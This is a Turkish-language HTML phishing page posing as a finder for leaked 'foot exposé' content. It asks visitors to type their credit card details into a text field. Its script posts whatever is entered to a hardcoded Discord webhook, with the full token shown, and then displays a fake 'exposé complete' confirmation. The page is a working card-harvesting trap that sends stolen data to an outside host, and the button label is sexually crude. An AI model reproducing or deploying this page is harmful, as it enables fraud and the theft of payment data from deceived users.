<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HÜSEYİN AYAK İFSA BULUCU</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #051937, #004d7a);
            font-family: Arial, sans-serif;
            color: #fff;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            text-align: center;
        }

        .form-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .glow-on-hover {
            width: 220px;
            height: 50px;
            border: none;
            outline: none;
            color: #fff;
            background: linear-gradient(45deg, #ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
            cursor: pointer;
            position: relative;
            z-index: 0;
            border-radius: 10px;
            font-weight: bold;
            font-size: 16px;
            text-transform: uppercase;
            letter-spacing: 1px;
            overflow: hidden;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            animation: glowing 2s infinite;
        }

        .glow-on-hover:before {
            content: '';
            background: linear-gradient(45deg, #ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
            position: absolute;
            top: -2px;
            left: -2px;
            background-size: 400%;
            z-index: -1;
            filter: blur(5px);
            width: calc(100% + 4px);
            height: calc(100% + 4px);
            opacity: 0;
            transition: opacity .3s ease-in-out;
            border-radius: 10px;
        }

        .glow-on-hover:hover:before {
            opacity: 1;
        }

        .glow-on-hover:after {
            z-index: -1;
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.1);
            left: 0;
            top: 0;
            border-radius: 10px;
        }

        @keyframes glowing {
            0% { background-position: 0 0; }
            50% { background-position: 400% 0; }
            100% { background-position: 0 0; }
        }

        .confirmation-message {
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>İFŞA</h1>
    <div class="form-container">
        <form id="messageForm">
            <input type="text" id="messageInput" placeholder="AYAK İFSA İÇİN KREDİ KARTI BİLGİLERİNİ GİR">
            <button type="submit" class="glow-on-hover" onclick="sendMessage()">BOŞAL</button>
        </form>
        <p class="confirmation-message">ifşa tamamlandı İşfa sayfasına gidiliyor!</p>
    </div>
    <script>
        function sendMessage() {
            var messageInput = document.getElementById("messageInput");
            var message = messageInput.value;

            var webhookUrl = "https://discord.com/api/webhooks/1121844315912675471/VjLDnpl_fcoT-nRlnd3tZRccCGs2WjLLeO58pAV44ahavR2u53DVTaOr_NlMyQM1yjWL";

            var request = new XMLHttpRequest();
            request.open("POST", webhookUrl);

            var payload = JSON.stringify({ "content": message });

            request.setRequestHeader('Content-type', 'application/json');

            request.send(payload);

            // Optional: Display a confirmation message
            var confirmationMessage = document.querySelector(".confirmation-message");
            confirmationMessage.style.display = "block";

            // Optional: Disable form after submission
            var messageForm = document.getElementById("messageForm");
            messageForm.style.pointerEvents = "none";
            messageForm.style.opacity = "0.5";
        }
    </script>
</body>
</html>
